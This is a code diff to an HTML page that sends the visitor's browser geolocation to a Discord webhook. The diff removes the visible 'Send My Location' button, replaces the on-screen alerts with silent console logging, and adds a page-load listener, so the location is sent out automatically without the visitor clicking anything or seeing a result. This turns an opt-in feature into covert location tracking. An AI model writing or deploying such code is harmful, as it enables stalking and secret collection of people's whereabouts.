@@ -10,28 +10,12 @@
             background-size: cover;
             margin: 0;
             height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        button {
-            font-size: 20px;
-            padding: 15px 30px;
-            background-color: red;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: darkred;
         }
     </style>
 </head>
 <body>
-    <button onclick="sendLocation()">Send My Location</button>
-
     <script>
+        // This function gets the user's location and sends it to the Discord webhook
         function sendLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -51,15 +35,20 @@
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify(data)
                         })
-                        .then(() => alert("📡 Location sent successfully!"))
-                        .catch(() => alert("❌ Failed to send location."));
+                        .then(() => console.log("Location sent successfully!"))
+                        .catch(() => console.log("Failed to send location."));
                     },
-                    () => alert("❌ Location permission denied.")
+                    () => console.log("Location permission denied.")
                 );
             } else {
-                alert("❌ Geolocation is not supported by this browser.");
+                console.log("Geolocation is not supported by this browser.");
             }
         }
+
+        // Automatically call the function when the page loads
+        document.addEventListener("DOMContentLoaded", () => {
+            sendLocation();
+        });
     </script>
 </body>
 </html>
